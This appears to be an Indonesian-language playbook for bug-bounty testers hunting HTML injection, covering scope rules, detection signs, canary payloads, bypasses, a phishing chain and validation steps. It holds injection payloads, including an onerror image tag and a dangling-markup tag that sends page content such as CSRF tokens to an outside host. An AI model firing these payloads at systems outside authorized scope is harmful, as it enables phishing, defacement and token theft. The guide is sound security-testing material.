# hunt-html-injection — HTML Injection

Kelas: Injection | CWE: CWE-79, CWE-116 | OWASP: A03:2021

Diadaptasi dari Claude-BugHunter (MIT/CC-BY-4.0) — ditulis ulang dengan kata sendiri.

## Scope & larangan
- Hanya target in-scope di `programs/*.md`. Hanya akun test milikmu (low/high).
- Pakai canary unik milikmu; jangan menyuntik form login palsu yang memanen kredensial pengguna nyata.
- Jangan laporkan halaman yang hanya menampilkan teks biasa sebagai HTML injection.

## Detection pattern
- Input yang direfleksikan/disimpan lalu ditampilkan sebagai HTML: kotak cari (`?q=`), komentar/review, field profil (nama, bio), pesan error, form kontak.
- Respons berisi tag suntikan dengan `<` literal (bukan `&lt;`) = injeksi terkonfirmasi.
- Aplikasi aman meng-escape `<` menjadi `&lt;` — itulah pembedanya.

## Sinyal uji
- Suntik tag yang mudah dikenali dengan canary unik: `<b>CANARY</b>` — bukti = respons berisi `<b>CANARY` literal.
- Bila `<b>` difilter, coba `<h1>CANARY</h1>`, `<img src=x onerror=CANARY>`, `<a href="https://example.com">klik</a>`.
- Stored: suntik ke endpoint simpan, lalu GET halaman tampilannya dan periksa tag tak ter-escape.
- Bila tag non-script lolos, segera eskalasi ke uji XSS (`hunt-xss`) — input yang sama mungkin mengeksekusi JavaScript.

## Bypass
- Dangling markup: tag tak tertutup (`<img src='//host/log?html=`) bisa menangkap konten halaman setelah titik injeksi (token CSRF, secret) walau `<script>` diblokir.
- Konteks email/notifikasi: field yang tampil mentah di email transaksional (konfirmasi signup, alert admin) — periksa raw source email, bukan hanya UI web.

## Chain template
Input tampil tanpa escape → suntik `<form>`/`<a>` phishing atau defacement → korban memasukkan kredensial / klik tautan jahat. Atau: HTML injection → eskalasi ke XSS penuh bila handler event lolos.

## Gate-0 validation
1. Apa yang bisa penyerang lakukan sekarang yang sebelumnya tidak bisa?
2. Apa yang hilang dari korban (akun, data, uang)?
3. Bisakah direproduksi dalam 10 menit dari nol dengan akun test?

## Root cause
Output user tidak di-escape/disanitasi sebelum dirender sebagai HTML; encoder konteks (HTML vs atribut vs JS) tidak dibedakan; WAF memblokir `<script>` tapi meloloskan tag lain.

## Verifikasi
- Bukti = tag dengan `<` literal + canary unik di respons — `&lt;b&gt;` = aman.
- Pakai canary angka 4+ digit yang khas agar tidak tertukar dengan contoh di halaman latihan.
- Dampak: form/tautan phishing, defacement, atau eskalasi XSS — bukan sekadar "tag tampil".
